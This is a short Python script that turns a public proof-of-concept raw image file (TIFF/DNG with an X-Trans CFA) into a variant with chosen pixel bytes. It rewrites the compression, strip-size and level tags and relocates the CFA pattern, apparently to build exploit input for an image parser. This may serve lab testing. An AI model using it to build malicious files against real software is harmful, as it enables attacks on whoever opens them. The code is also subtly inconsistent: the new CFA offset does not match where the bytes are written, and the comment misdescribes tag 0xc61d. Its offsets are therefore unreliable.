#!/usr/bin/env python3
"""Provision a lab-only variant of the public PoC with uncompressed, chosen
pixel bytes. Keeps the PoC's X-Trans CFA layout and dimensions; no network use.

usage: craft_poc.py SRC DST VALUE
"""
import struct
import sys
from PIL import Image

src, dst, value = sys.argv[1], sys.argv[2], int(sys.argv[3], 0)
d = bytearray(open(src, "rb").read())
IFD0 = 8
N = struct.unpack_from("<H", d, IFD0)[0]


def entry(tag):
    for i in range(N):
        e = IFD0 + 2 + 12 * i
        if struct.unpack_from("<H", d, e)[0] == tag:
            return e
    raise KeyError(hex(tag))


# Inline tag values: Compression 7 (JPEG) -> 1 (uncompressed).
struct.pack_into("<H", d, entry(0x103) + 8, 1)
# StripByteCounts -> a full 512x512 8-bit frame.
struct.pack_into("<I", d, entry(0x117) + 8, 512 * 512)
# DNG black-level-like tag 0xc61d = 255 cancels pixel values; zero it.
struct.pack_into("<I", d, entry(0xc61d) + 8, 0)

# Relocate the 36-byte CFA pattern so it is not overwritten by raw pixels.
cfa_off = struct.unpack_from("<I", d, entry(0x828e) + 8)[0]
cfa = bytes(d[cfa_off:cfa_off + 36])
new_cfa_off = len(d)
struct.pack_into("<I", d, entry(0x828e) + 8, new_cfa_off)

# IFD0 ends at 278; raw pixels start at StripOffsets 484.
start = struct.unpack_from("<I", d, entry(0x111) + 8)[0]
assert start == 484
pixels = bytes([value]) * (512 * 512)
out = bytes(d[:start]) + pixels + bytes(d[262144:]) + cfa
open(dst, "wb").write(out)
print(f"value=0x{value:02x} file_len={len(out)} cfa={cfa_off}->{new_cfa_off}")
